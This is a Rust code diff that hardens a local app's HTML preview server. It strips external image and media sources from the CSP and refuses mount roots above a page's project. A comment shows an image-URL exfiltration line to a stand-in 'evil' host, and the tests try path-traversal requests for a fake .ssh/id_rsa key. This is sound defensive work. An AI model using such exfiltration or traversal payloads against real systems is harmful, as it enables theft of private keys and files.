@@ -47,12 +47,17 @@ const HTML_INJECT_MAX_BYTES: usize = 4 * 1024 * 1024;
 /// 1. It cannot access `window.parent` DOM or globals.
 /// 2. It cannot read the host session cookies (`document.cookie` is empty).
 /// 3. Any fetch to `/api/rpc` sends `Origin: null`, which is rejected by the server's origin gate.
+///
+/// `img-src` and `media-src` carry no `https:` source: a previewed page can read
+/// files under its mount (`connect-src 'self'`), and an `https:` image or media
+/// URL is a write channel to any host (`new Image().src = "https://evil/?" + data`).
+/// Previews are in-app only, so nothing legitimate needs an external fetch.
 pub const VIEWER_CSP: &str = "sandbox allow-scripts; default-src 'self' data: blob:; \
 script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdn.tailwindcss.com https://esm.sh https://cdn.skypack.dev; \
 style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdn.tailwindcss.com; \
-img-src 'self' data: blob: https:; \
+img-src 'self' data: blob:; \
 font-src 'self' data: https://fonts.gstatic.com https://cdn.jsdelivr.net; \
-media-src 'self' blob: https:; \
+media-src 'self' blob:; \
 connect-src 'self'";
 
 /// URL path prefix for viewer routes.
@@ -199,6 +204,86 @@ pub fn random_token_hex(n_bytes: usize) -> String {
     hex::encode(buf)
 }
 
+/// Why `viewer_serve` refused a root. Names neither the project root nor any
+/// path it was not handed: the caller already knows what it asked for.
+pub const ROOT_ABOVE_PROJECT: &str =
+    "preview root is above the project root; refusing to widen the viewer mount beyond it";
+
+/// The deepest project root (from the daemon's own `projects` table) that
+/// contains `file`, or `None` when the file belongs to no project.
+///
+/// A root that is, or contains, `home` is skipped: a project registered at the
+/// whole home directory bounds nothing, so a file under it falls back to the
+/// next project, or to its own directory. The default project has no root.
+pub(crate) fn project_root_of(
+    file: &Path,
+    project_roots: &[PathBuf],
+    home: Option<&Path>,
+) -> Option<PathBuf> {
+    project_roots
+        .iter()
+        .filter(|r| r.parent().is_some()) // `/` is not a project
+        .filter(|r| home.is_none_or(|h| !h.starts_with(r)))
+        .filter(|r| file.starts_with(r))
+        .max_by_key(|r| r.components().count())
+        .cloned()
+}
+
+/// Whether a viewer mount rooted at `root` may serve the page `file`
+/// (both canonical). The root must contain the file, and may reach no higher
+/// than the file's project root, or, for a file in no project, its own
+/// directory. A root above that bound is refused, never silently clamped.
+///
+/// This is the only thing keeping an `<img src="../../../.ssh/id_rsa">` in a
+/// hostile page from widening the mount to the whole home (the widened root
+/// is computed client-side from the page's own markup).
+pub(crate) fn check_root(
+    root: &Path,
+    file: &Path,
+    project_roots: &[PathBuf],
+    home: Option<&Path>,
+) -> Result<(), String> {
+    if !file.starts_with(root) {
+        return Err("preview root does not contain the file".to_string());
+    }
+    let bound = match project_root_of(file, project_roots, home) {
+        Some(p) => p,
+        None => file
+            .parent()
+            .map(Path::to_path_buf)
+            .ok_or_else(|| "preview file has no directory".to_string())?,
+    };
+    if root.starts_with(&bound) {
+        Ok(())
+    } else {
+        Err(ROOT_ABOVE_PROJECT.to_string())
+    }
+}
+
+/// Canonical roots of the active projects in this daemon's `ikenga.db`. Under
+/// T1 that is the calling principal's own child database; under a share the
+/// Owner's. Unreadable rows (missing directory, no root) are skipped, which
+/// can only shrink the set of project roots and so only tighten the bound.
+pub(crate) async fn project_roots(state: &AppState) -> Vec<PathBuf> {
+    let Some(db) = state.pa_db.as_ref() else {
+        return Vec::new();
+    };
+    let Ok(pool) = db.ensure_reader_pool().await else {
+        return Vec::new();
+    };
+    let rows: Vec<(Option<String>,)> =
+        sqlx::query_as("SELECT root_path FROM projects WHERE archived_at IS NULL")
+            .fetch_all(&pool)
+            .await
+            .unwrap_or_default();
+    rows.into_iter()
+        .filter_map(|(r,)| r)
+        .filter(|r| !r.trim().is_empty())
+        .filter_map(|r| Path::new(&r).canonicalize().ok())
+        .filter(|r| r.is_dir())
+        .collect()
+}
+
 /// Safely join `root` and `rel`, rejecting traversal segments (`..`), root prefixes,
 /// and symlinks that escape `root`.
 pub fn safe_join(root: &Path, rel: &str) -> Option<PathBuf> {
@@ -230,9 +315,7 @@ fn find_head_insert(html: &str) -> Option<usize> {
         let i = from + rel;
         match bytes.get(i + 5) {
             Some(b'>') | Some(b'/') => return html[i..].find('>').map(|j| i + j + 1),
-            Some(c) if c.is_ascii_whitespace() => {
-                return html[i..].find('>').map(|j| i + j + 1)
-            }
+            Some(c) if c.is_ascii_whitespace() => return html[i..].find('>').map(|j| i + j + 1),
             _ => from = i + 5,
         }
     }
@@ -268,7 +351,8 @@ fn inject_iyke_bridge(html: &str) -> String {
     if html.contains(IYKE_INJECT_MARKER) {
         return html.to_string();
     }
-    let script = format!("{IYKE_INJECT_MARKER}\n<script type=\"module\">\n{IYKE_BRIDGE_JS}\n</script>\n");
+    let script =
+        format!("{IYKE_INJECT_MARKER}\n<script type=\"module\">\n{IYKE_BRIDGE_JS}\n</script>\n");
     let mut out = String::with_capacity(html.len() + script.len());
     if let Some(insert_at) = find_head_insert(html) {
         out.push_str(&html[..insert_at]);
@@ -433,10 +517,7 @@ async fn serve_mount_file(
     // on every request (the mount root alone is not enough: the allowlist can
     // shrink after `viewer_serve`, and the root may contain the daemon's dirs).
     if let Err(e) = state.path_guard.check(&target) {
-        tracing::warn!(
-            "viewer: path_guard check refused {}: {e}",
-            target.display()
-        );
+        tracing::warn!("viewer: path_guard check refused {}: {e}", target.display());
         return refuse(StatusCode::FORBIDDEN);
     }
 
@@ -462,9 +543,7 @@ async fn serve_mount_file(
             if !too_big {
                 if let Ok(bytes) = tokio::fs::read(&target).await {
                     let out = match std::str::from_utf8(&bytes) {
-                        Ok(html) => {
-                            inject_iyke_bridge(&inject_artifact_bridge(html)).into_bytes()
-                        }
+                        Ok(html) => inject_iyke_bridge(&inject_artifact_bridge(html)).into_bytes(),
                         Err(_) => bytes,
                     };
                     let len = out.len();
@@ -472,7 +551,11 @@ async fn serve_mount_file(
                         .status(StatusCode::OK)
                         .header(header::CONTENT_TYPE, "text/html; charset=utf-8")
                         .header(header::CONTENT_LENGTH, len)
-                        .body(if is_head { Body::empty() } else { Body::from(out) })
+                        .body(if is_head {
+                            Body::empty()
+                        } else {
+                            Body::from(out)
+                        })
                         .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
                 }
             }
@@ -490,15 +573,18 @@ async fn serve_mount_file(
     parts
         .headers
         .insert(header::CACHE_CONTROL, HeaderValue::from_static("no-cache"));
-    parts
-        .headers
-        .insert(header::X_CONTENT_TYPE_OPTIONS, HeaderValue::from_static("nosniff"));
-    parts
-        .headers
-        .insert(header::REFERRER_POLICY, HeaderValue::from_static("no-referrer"));
-    parts
-        .headers
-        .insert(header::ACCESS_CONTROL_ALLOW_ORIGIN, HeaderValue::from_static("*"));
+    parts.headers.insert(
+        header::X_CONTENT_TYPE_OPTIONS,
+        HeaderValue::from_static("nosniff"),
+    );
+    parts.headers.insert(
+        header::REFERRER_POLICY,
+        HeaderValue::from_static("no-referrer"),
+    );
+    parts.headers.insert(
+        header::ACCESS_CONTROL_ALLOW_ORIGIN,
+        HeaderValue::from_static("*"),
+    );
 
     // The sandbox directive must never be absent: a host that cannot be
     // spliced in safely just gets the base policy.
@@ -552,6 +638,25 @@ mod tests {
     }
 
     #[test]
+    fn csp_has_no_external_image_or_media_sources() {
+        for d in VIEWER_CSP.split("; ") {
+            if d.starts_with("img-src") || d.starts_with("media-src") {
+                assert!(!d.contains("http"), "{d}");
+                assert!(!d.contains("*"), "{d}");
+            }
+        }
+        // Same after the request's own host is spliced in: only that host.
+        let csp = csp_for_host(VIEWER_CSP, "localhost:3000");
+        let img = csp.split("; ").find(|d| d.starts_with("img-src")).unwrap();
+        assert!(
+            !img.split_whitespace()
+                .any(|t| t == "https:" || t == "http:"),
+            "{img}"
+        );
+        assert!(VIEWER_CSP.contains("connect-src 'self'"));
+    }
+
+    #[test]
     fn csp_contains_sandbox() {
         assert!(VIEWER_CSP.starts_with("sandbox allow-scripts;"));
         let host_csp = csp_for_host(VIEWER_CSP, "localhost:3000");
@@ -561,7 +666,8 @@ mod tests {
 
     #[test]
     fn bridge_injection_ordering() {
-        let sample = "<!doctype html><html><head><title>Test</title></head><body><h1>Hi</h1></body></html>";
+        let sample =
+            "<!doctype html><html><head><title>Test</title></head><body><h1>Hi</h1></body></html>";
         let injected = inject_artifact_bridge(sample);
         assert!(injected.contains(ARTIFACT_INJECT_MARKER));
         assert!(injected.contains("ikenga-tokens"));
@@ -583,16 +689,34 @@ mod tests {
         root: PathBuf,
         _dir: tempfile::TempDir,
         roots: Arc<crate::fs_roots::FsRoots>,
+        db: Option<Arc<crate::db::PaDb>>,
         app: axum::Router,
     }
 
     /// A T0 router whose allowlist is `root` and whose data dir is `root/data`.
     fn fixture() -> Fixture {
+        fixture_with(false, None)
+    }
+
+    /// [`fixture`] with a project store (`with_db`: `<root>/data/ikenga.db`)
+    /// and a home seam (`home_sub`: a directory under the root).
+    fn fixture_with(with_db: bool, home_sub: Option<&str>) -> Fixture {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path().canonicalize().unwrap();
         fs::create_dir_all(root.join("data")).unwrap();
+        let db =
+            with_db.then(|| Arc::new(crate::db::PaDb::new(root.join("data").join("ikenga.db"))));
+        let home = home_sub.map(|h| {
+            let p = root.join(h);
+            fs::create_dir_all(&p).unwrap();
+            p
+        });
         let roots_file = dir.path().join("roots.json");
-        fs::write(&roots_file, json!({ "roots": [root.to_string_lossy()] }).to_string()).unwrap();
+        fs::write(
+            &roots_file,
+            json!({ "roots": [root.to_string_lossy()] }).to_string(),
+        )
+        .unwrap();
         let roots = Arc::new(crate::fs_roots::FsRoots::load(roots_file).unwrap());
         let config = crate::server::ServerConfig {
             host: "127.0.0.1".into(),
@@ -609,9 +733,9 @@ mod tests {
             config,
             Arc::new(crate::pty::PtyManager::new()),
             Arc::new(crate::engines::EngineRegistry::new()),
+            db.clone(),
             None,
-            None,
-            None,
+            home,
             crate::server::rpc_shell::PathGuard::roots(roots.clone()),
             None,
             crate::access::DaemonAccess::unavailable(),
@@ -622,6 +746,7 @@ mod tests {
             root,
             _dir: dir,
             roots,
+            db,
             app,
         }
     }
@@ -636,17 +761,52 @@ mod tests {
                 .body(Body::from(json!({ "cmd": cmd, "args": args }).to_string()))
                 .unwrap();
             let resp = self.app.clone().oneshot(req).await.unwrap();
-            let bytes = axum::body::to_bytes(resp.into_body(), 1_000_000).await.unwrap();
+            let bytes = axum::body::to_bytes(resp.into_body(), 1_000_000)
+                .await
+                .unwrap();
             serde_json::from_slice(&bytes).unwrap()
         }
 
-        /// Mount `dir` and return its token.
+        /// Mount `dir` for the first regular file in it and return the token.
         async fn mount(&self, dir: &Path) -> String {
-            let v = self
-                .rpc("viewer_serve", json!({ "rootDir": dir.to_string_lossy() }))
-                .await;
+            let mut files: Vec<PathBuf> = fs::read_dir(dir)
+                .unwrap()
+                .filter_map(|e| e.ok().map(|e| e.path()))
+                .filter(|p| p.is_file())
+                .collect();
+            files.sort();
+            let file = files.into_iter().next().expect("a file in the mounted dir");
+            self.mount_for(dir, &file).await
+        }
+
+        /// `viewer_serve` with `root` for the page `file`; the raw response.
+        async fn serve(&self, root: &Path, file: &Path) -> serde_json::Value {
+            self.rpc(
+                "viewer_serve",
+                json!({ "rootDir": root.to_string_lossy(), "filePath": file.to_string_lossy() }),
+            )
+            .await
+        }
+
+        async fn mount_for(&self, root: &Path, file: &Path) -> String {
+            let v = self.serve(root, file).await;
             assert!(v["ok"].as_bool().unwrap_or(false), "viewer_serve: {v}");
             v["data"]["token"].as_str().unwrap().to_string()
+        }
+
+        /// Register `root` as an active project of this daemon.
+        async fn add_project(&self, id: &str, root: &Path) {
+            let pool = self.db.as_ref().unwrap().ensure_pool().await.unwrap();
+            sqlx::query(
+                "INSERT INTO projects (id, display_name, root_path, position, is_default, created_at) \
+                 VALUES (?, ?, ?, 1, 0, 0)",
+            )
+            .bind(id)
+            .bind(id)
+            .bind(root.to_string_lossy().into_owned())
+            .execute(&pool)
+            .await
+            .unwrap();
         }
 
         /// A credential-less request, as a sandboxed viewer page makes it.
@@ -660,9 +820,16 @@ mod tests {
             for (k, v) in headers {
                 b = b.header(*k, *v);
             }
-            let resp = self.app.clone().oneshot(b.body(Body::empty()).unwrap()).await.unwrap();
+            let resp = self
+                .app
+                .clone()
+                .oneshot(b.body(Body::empty()).unwrap())
+                .await
+                .unwrap();
             let (status, h) = (resp.status(), resp.headers().clone());
-            let bytes = axum::body::to_bytes(resp.into_body(), 10_000_000).await.unwrap();
+            let bytes = axum::body::to_bytes(resp.into_body(), 10_000_000)
+                .await
+                .unwrap();
             (status, h, bytes.to_vec())
         }
     }
@@ -672,15 +839,20 @@ mod tests {
         let f = fixture();
         let sub = f.root.join("assets");
         fs::create_dir_all(&sub).unwrap();
-        let html = "<!doctype html><html><head><title>T</title></head><body><h1>Hello</h1></body></html>";
+        let html =
+            "<!doctype html><html><head><title>T</title></head><body><h1>Hello</h1></body></html>";
         fs::write(sub.join("index.html"), html).unwrap();
         fs::write(sub.join("style.css"), "body { color: red; }").unwrap();
         fs::write(sub.join("a.mp3"), vec![0u8; 100]).unwrap();
         fs::write(sub.join("v.mp4"), vec![1u8; 64]).unwrap();
-        fs::write(sub.join("i.svg"), "<svg xmlns='http://www.w3.org/2000/svg'/>").unwrap();
+        fs::write(
+            sub.join("i.svg"),
+            "<svg xmlns='http://www.w3.org/2000/svg'/>",
+        )
+        .unwrap();
 
         let res = f
-            .rpc("viewer_serve", json!({ "rootDir": sub.to_string_lossy() }))
+            .rpc("viewer_serve", json!({ "rootDir": sub.to_string_lossy(), "filePath": sub.join("index.html").to_string_lossy() }))
             .await;
         let token = res["data"]["token"].as_str().unwrap().to_string();
         assert_eq!(res["data"]["url"], format!("/__viewer/{token}/"));
@@ -688,7 +860,11 @@ mod tests {
 
         // HTML: injected, sandboxed, host spliced into the CSP.
         let (st, h, body) = f
-            .get("GET", &format!("/__viewer/{token}/index.html"), &[("host", "localhost:5173")])
+            .get(
+                "GET",
+                &format!("/__viewer/{token}/index.html"),
+                &[("host", "localhost:5173")],
+            )
             .await;
         assert_eq!(st, StatusCode::OK);
         let csp = h[header::CONTENT_SECURITY_POLICY].to_str().unwrap();
@@ -696,7 +872,10 @@ mod tests {
         assert!(csp.contains("http://localhost:5173"));
         assert!(!csp.contains("allow-same-origin"));
         assert_eq!(h[header::X_CONTENT_TYPE_OPTIONS], "nosniff");
-        assert!(h[header::CONTENT_TYPE].to_str().unwrap().starts_with("text/html"));
+        assert!(h[header::CONTENT_TYPE]
+            .to_str()
+            .unwrap()
+            .starts_with("text/html"));
         let body = String::from_utf8(body).unwrap();
         assert!(body.contains(ARTIFACT_INJECT_MARKER) && body.contains(IYKE_INJECT_MARKER));
         assert!(body.contains("<h1>Hello</h1>"));
@@ -712,7 +891,9 @@ mod tests {
             ("v.mp4", "video/mp4"),
             ("i.svg", "image/svg+xml"),
         ] {
-            let (st, h, _) = f.get("GET", &format!("/__viewer/{token}/{name}"), &[]).await;
+            let (st, h, _) = f
+                .get("GET", &format!("/__viewer/{token}/{name}"), &[])
+                .await;
             assert_eq!(st, StatusCode::OK, "{name}");
             assert!(
                 h[header::CONTENT_TYPE].to_str().unwrap().starts_with(ct),
@@ -728,42 +909,214 @@ mod tests {
 
         // A service-worker script fetch is refused.
         let (st, _, _) = f
-            .get("GET", &format!("/__viewer/{token}/sw.js"), &[("service-worker", "script")])
+            .get(
+                "GET",
+                &format!("/__viewer/{token}/sw.js"),
+                &[("service-worker", "script")],
+            )
             .await;
         assert_eq!(st, StatusCode::FORBIDDEN);
 
         // `..` never reaches the route's file lookup.
-        let (st, _, _) = f.get("GET", &format!("/__viewer/{token}/../secret.txt"), &[]).await;
-        assert!(st == StatusCode::NOT_FOUND || st == StatusCode::BAD_REQUEST, "{st}");
-        let (st, _, _) = f.get("GET", &format!("/__viewer/{token}/%2e%2e/secret.txt"), &[]).await;
+        let (st, _, _) = f
+            .get("GET", &format!("/__viewer/{token}/../secret.txt"), &[])
+            .await;
+        assert!(
+            st == StatusCode::NOT_FOUND || st == StatusCode::BAD_REQUEST,
+            "{st}"
+        );
+        let (st, _, _) = f
+            .get("GET", &format!("/__viewer/{token}/%2e%2e/secret.txt"), &[])
+            .await;
         assert_eq!(st, StatusCode::NOT_FOUND);
-        let (st, _, _) = f.get("GET", &format!("/__viewer/{token}/..%2fsecret.txt"), &[]).await;
+        let (st, _, _) = f
+            .get("GET", &format!("/__viewer/{token}/..%2fsecret.txt"), &[])
+            .await;
         assert_eq!(st, StatusCode::NOT_FOUND);
 
         // Credentials: the token is the credential; a wrong one, or a write
         // method, is a 401 (no mount, or the normal auth wall).
         let (st, _, _) = f.get("GET", "/__viewer/deadbeef/index.html", &[]).await;
         assert_eq!(st, StatusCode::UNAUTHORIZED);
-        let (st, _, _) = f.get("POST", &format!("/__viewer/{token}/index.html"), &[]).await;
+        let (st, _, _) = f
+            .get("POST", &format!("/__viewer/{token}/index.html"), &[])
+            .await;
         assert_eq!(st, StatusCode::UNAUTHORIZED);
 
         // viewer_stop revokes it.
         let v = f.rpc("viewer_stop", json!({ "token": token })).await;
         assert!(v["ok"].as_bool().unwrap_or(false));
-        let (st, _, _) = f.get("GET", &format!("/__viewer/{token}/index.html"), &[]).await;
+        let (st, _, _) = f
+            .get("GET", &format!("/__viewer/{token}/index.html"), &[])
+            .await;
         assert_eq!(st, StatusCode::UNAUTHORIZED);
     }
 
     #[tokio::test]
     async fn viewer_serve_refuses_a_root_outside_the_allowlist() {
         let f = fixture();
-        let v = f.rpc("viewer_serve", json!({ "rootDir": "/etc" })).await;
+        let v = f.serve(Path::new("/etc"), Path::new("/etc/hostname")).await;
         assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
         // The daemon's own data dir is refused even though it sits inside the root.
+        let data = f.root.join("data");
+        fs::write(data.join("page.html"), "x").unwrap();
+        let v = f.serve(&data, &data.join("page.html")).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+    }
+
+    /// `viewer_serve` without the page it previews cannot be bounded, so it
+    /// is refused (an old cached client sends only `rootDir`).
+    #[tokio::test]
+    async fn viewer_serve_requires_the_file_being_previewed() {
+        let f = fixture();
         let v = f
-            .rpc("viewer_serve", json!({ "rootDir": f.root.join("data").to_string_lossy() }))
+            .rpc(
+                "viewer_serve",
+                json!({ "rootDir": f.root.to_string_lossy() }),
+            )
             .await;
         assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+    }
+
+    /// The attack: `proj/page.html` carries `<img src="../../.ssh/id_rsa">`,
+    /// which the client turns into a root at the home directory. The daemon
+    /// refuses that root, accepts the project root, and under the project
+    /// mount `../.ssh/id_rsa` is a 404.
+    #[tokio::test]
+    async fn a_widened_root_is_refused_and_the_project_mount_cannot_reach_outside() {
+        let f = fixture_with(true, Some("home"));
+        let home = f.root.join("home");
+        let proj = home.join("proj");
+        let ssh = home.join(".ssh");
+        fs::create_dir_all(proj.join("pages")).unwrap();
+        fs::create_dir_all(proj.join("_shared")).unwrap();
+        fs::create_dir_all(&ssh).unwrap();
+        fs::write(ssh.join("id_rsa"), "FAKE-PRIVATE-KEY").unwrap();
+        fs::write(proj.join("_shared/tokens.css"), "a{}").unwrap();
+        let page = proj.join("pages/page.html");
+        fs::write(&page, "<img src=\"../../../.ssh/id_rsa\">").unwrap();
+        f.add_project("p1", &proj).await;
+
+        // Home, and the dir between home and the project: both above the project.
+        for root in [&home, &f.root, home.join("proj/..").as_path()] {
+            let v = f.serve(root, &page).await;
+            assert!(!v["ok"].as_bool().unwrap_or(true), "{root:?}: {v}");
+        }
+        let v = f.serve(&home, &page).await;
+        assert!(
+            v["error"]
+                .as_str()
+                .unwrap_or_default()
+                .contains("above the project root"),
+            "{v}"
+        );
+        assert!(!v.to_string().contains("FAKE-PRIVATE-KEY"));
+
+        // The project root works, so ../_shared/tokens.css (inside it) still loads.
+        let token = f.mount_for(&proj, &page).await;
+        let (st, _, body) = f
+            .get("GET", &format!("/__viewer/{token}/_shared/tokens.css"), &[])
+            .await;
+        assert_eq!((st, &body[..]), (StatusCode::OK, &b"a{}"[..]));
+        // A root below the project (the page's own dir) works too.
+        f.mount_for(&proj.join("pages"), &page).await;
+
+        // Under the project mount, climbing out is a 404 in every spelling.
+        for uri in [
+            format!("/__viewer/{token}/../.ssh/id_rsa"),
+            format!("/__viewer/{token}/%2e%2e/.ssh/id_rsa"),
+            format!("/__viewer/{token}/pages/../../.ssh/id_rsa"),
+            format!("/__viewer/{token}/%2e%2e%2f.ssh%2fid_rsa"),
+        ] {
+            let (st, _, body) = f.get("GET", &uri, &[]).await;
+            assert_ne!(st, StatusCode::OK, "{uri}");
+            assert!(
+                !String::from_utf8_lossy(&body).contains("FAKE-PRIVATE-KEY"),
+                "{uri}"
+            );
+        }
+        let (st, _, _) = f
+            .get("GET", &format!("/__viewer/{token}/.ssh/id_rsa"), &[])
+            .await;
+        assert_eq!(st, StatusCode::NOT_FOUND);
+    }
+
+    /// A page in no project may mount only its own directory; a project that
+    /// is the whole home (or contains it) bounds nothing and is ignored.
+    #[tokio::test]
+    async fn a_page_in_no_project_cannot_widen_and_a_home_project_bounds_nothing() {
+        let f = fixture_with(true, Some("home"));
+        let home = f.root.join("home");
+        let docs = home.join("docs/sub");
+        fs::create_dir_all(&docs).unwrap();
+        fs::write(home.join("docs/shared.css"), "x").unwrap();
+        let page = docs.join("page.html");
+        fs::write(&page, "<link href=\"../shared.css\">").unwrap();
+
+        // No project at all: own directory only.
+        f.mount_for(&docs, &page).await;
+        let v = f.serve(&home.join("docs"), &page).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+        let v = f.serve(&home, &page).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+
+        // A project registered at the home dir does not unlock widening.
+        f.add_project("everything", &home).await;
+        let v = f.serve(&home, &page).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+        let v = f.serve(&home.join("docs"), &page).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+
+        // A real project beneath it does.
+        f.add_project("docs", &home.join("docs")).await;
+        f.mount_for(&home.join("docs"), &page).await;
+        let v = f.serve(&home, &page).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+    }
+
+    /// A root that does not contain the page is refused.
+    #[tokio::test]
+    async fn a_root_must_contain_the_page() {
+        let f = fixture_with(true, Some("home"));
+        let a = f.root.join("home/a");
+        let b = f.root.join("home/b");
+        fs::create_dir_all(&a).unwrap();
+        fs::create_dir_all(&b).unwrap();
+        fs::write(a.join("p.html"), "x").unwrap();
+        let v = f.serve(&b, &a.join("p.html")).await;
+        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
+    }
+
+    #[test]
+    fn check_root_unit() {
+        let p = |s: &str| PathBuf::from(s);
+        let projects = vec![p("/h/proj"), p("/h/proj/inner"), p("/h")];
+        let home = p("/h");
+        // `/h` is the home: ignored. The deepest remaining project bounds.
+        assert_eq!(
+            project_root_of(Path::new("/h/proj/inner/x/a.html"), &projects, Some(&home)),
+            Some(p("/h/proj/inner"))
+        );
+        assert_eq!(
+            project_root_of(Path::new("/h/other/a.html"), &projects, Some(&home)),
+            None
+        );
+        let ok = |root: &str, file: &str| {
+            check_root(Path::new(root), Path::new(file), &projects, Some(&home))
+        };
+        assert!(ok("/h/proj", "/h/proj/a/b.html").is_ok());
+        assert!(ok("/h/proj/a", "/h/proj/a/b.html").is_ok());
+        assert!(ok("/h", "/h/proj/a/b.html").is_err());
+        assert!(ok("/h/proj/inner", "/h/proj/inner/b.html").is_ok());
+        // Nested project: the deepest one bounds, so `/h/proj` is too high.
+        assert!(ok("/h/proj", "/h/proj/inner/b.html").is_err());
+        // No project: own directory only.
+        assert!(ok("/h/other", "/h/other/a.html").is_ok());
+        assert!(ok("/h", "/h/other/a.html").is_err());
+        // The root must contain the file.
+        assert!(ok("/h/proj/a", "/h/proj/b/c.html").is_err());
+        // `/` is never a project.
+        assert!(check_root(Path::new("/"), Path::new("/x/a.html"), &[p("/")], None).is_err());
     }
 
     /// A mount of an allowlisted parent that contains the daemon's data dir
@@ -776,25 +1129,39 @@ mod tests {
         fs::write(f.root.join("ok.txt"), "fine").unwrap();
         let token = f.mount(&f.root).await;
 
-        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/ok.txt"), &[]).await;
+        let (st, _, body) = f
+            .get("GET", &format!("/__viewer/{token}/ok.txt"), &[])
+            .await;
         assert_eq!((st, &body[..]), (StatusCode::OK, &b"fine"[..]));
 
-        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/data/fs_roots.json"), &[]).await;
+        let (st, _, body) = f
+            .get("GET", &format!("/__viewer/{token}/data/fs_roots.json"), &[])
+            .await;
         assert_eq!(st, StatusCode::FORBIDDEN);
         let body = String::from_utf8(body).unwrap();
         assert_eq!(body, "forbidden", "a refusal names neither path nor reason");
 
         // The double-encoded spelling of the same file is not a way around it.
-        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/data/fs_roots%2ejson"), &[]).await;
+        let (st, _, body) = f
+            .get(
+                "GET",
+                &format!("/__viewer/{token}/data/fs_roots%2ejson"),
+                &[],
+            )
+            .await;
         assert_ne!(st, StatusCode::OK);
         assert!(!String::from_utf8_lossy(&body).contains("secret"));
 
         // Shrink the allowlist after the mount was made: the mount keeps its
         // root but the file is now outside the allowlist.
         let other = tempfile::tempdir().unwrap();
-        f.roots.add(&other.path().canonicalize().unwrap().to_string_lossy()).unwrap();
+        f.roots
+            .add(&other.path().canonicalize().unwrap().to_string_lossy())
+            .unwrap();
         f.roots.remove(&f.root.to_string_lossy()).unwrap();
-        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/ok.txt"), &[]).await;
+        let (st, _, body) = f
+            .get("GET", &format!("/__viewer/{token}/ok.txt"), &[])
+            .await;
         assert_eq!(st, StatusCode::FORBIDDEN);
         assert_eq!(String::from_utf8(body).unwrap(), "forbidden");
     }
@@ -812,25 +1179,37 @@ mod tests {
         fs::write(f.root.join("outside.txt"), "TOPSECRET-outside-mount").unwrap();
         fs::write(f.root.join("data").join("fs_roots.json"), "{\"secret\":1}").unwrap();
         std::os::unix::fs::symlink(f.root.join("outside.txt"), www.join("leak")).unwrap();
-        std::os::unix::fs::symlink(f.root.join("data").join("fs_roots.json"), www.join("dbleak")).unwrap();
+        std::os::unix::fs::symlink(
+            f.root.join("data").join("fs_roots.json"),
+            www.join("dbleak"),
+        )
+        .unwrap();
         fs::write(www.join("lea%6b"), "decoy").unwrap();
         fs::write(www.join("dble%61k"), "decoy2").unwrap();
         let token = f.mount(&www).await;
 
         // The symlinks themselves leave the mount root.
         for name in ["leak", "lea%6b", "dbleak"] {
-            let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/{name}"), &[]).await;
+            let (st, _, body) = f
+                .get("GET", &format!("/__viewer/{token}/{name}"), &[])
+                .await;
             // `lea%6b` decodes once to `leak` (the symlink): refused too.
             assert_eq!(st, StatusCode::NOT_FOUND, "{name}");
             assert!(!String::from_utf8_lossy(&body).contains("TOPSECRET"));
         }
         // `lea%256b` decodes once to the decoy's literal name and serves the decoy.
-        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/lea%256b"), &[]).await;
+        let (st, _, body) = f
+            .get("GET", &format!("/__viewer/{token}/lea%256b"), &[])
+            .await;
         assert_eq!((st, &body[..]), (StatusCode::OK, &b"decoy"[..]));
-        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/dble%2561k"), &[]).await;
+        let (st, _, body) = f
+            .get("GET", &format!("/__viewer/{token}/dble%2561k"), &[])
+            .await;
         assert_eq!((st, &body[..]), (StatusCode::OK, &b"decoy2"[..]));
         // A triple-encoded spelling is just another (missing) literal name.
-        let (st, _, _) = f.get("GET", &format!("/__viewer/{token}/lea%25256b"), &[]).await;
+        let (st, _, _) = f
+            .get("GET", &format!("/__viewer/{token}/lea%25256b"), &[])
+            .await;
         assert_eq!(st, StatusCode::NOT_FOUND);
     }
 
@@ -877,7 +1256,14 @@ mod tests {
 
         // Malformed / unsupported / multi (overlapping) ranges are ignored: a
         // full 200, never a 416 a media element cannot recover from.
-        for ignored in ["bytes=abc", "items=0-1", "bytes=0-1,5-9", "bytes=0-20,10-30", "bytes=-", "bytes=5"] {
+        for ignored in [
+            "bytes=abc",
+            "items=0-1",
+            "bytes=0-1,5-9",
+            "bytes=0-20,10-30",
+            "bytes=-",
+            "bytes=5",
+        ] {
             let (st, _, body) = range(ignored).await;
             assert_eq!(st, StatusCode::OK, "{ignored}");
             assert_eq!(body, data, "{ignored}");
@@ -898,13 +1284,20 @@ mod tests {
         fs::create_dir_all(sub.join("dir")).unwrap();
         let html = "<!doctype html><html><head></head><body>0123456789</body></html>";
         fs::write(sub.join("index.html"), html).unwrap();
-        fs::write(sub.join("dir").join("index.html"), "<html><head></head><body>d</body></html>").unwrap();
+        fs::write(
+            sub.join("dir").join("index.html"),
+            "<html><head></head><body>d</body></html>",
+        )
+        .unwrap();
         let token = f.mount(&sub).await;
         let uri = format!("/__viewer/{token}/index.html");
 
         let (st, h, body) = f.get("GET", &uri, &[]).await;
         assert_eq!(st, StatusCode::OK);
-        assert_eq!(h[header::CONTENT_LENGTH].to_str().unwrap(), body.len().to_string());
+        assert_eq!(
+            h[header::CONTENT_LENGTH].to_str().unwrap(),
+            body.len().to_string()
+        );
 
         let (st, hh, hbody) = f.get("HEAD", &uri, &[]).await;
         assert_eq!(st, StatusCode::OK);
@@ -933,16 +1326,25 @@ mod tests {
         fs::create_dir_all(&sub).unwrap();
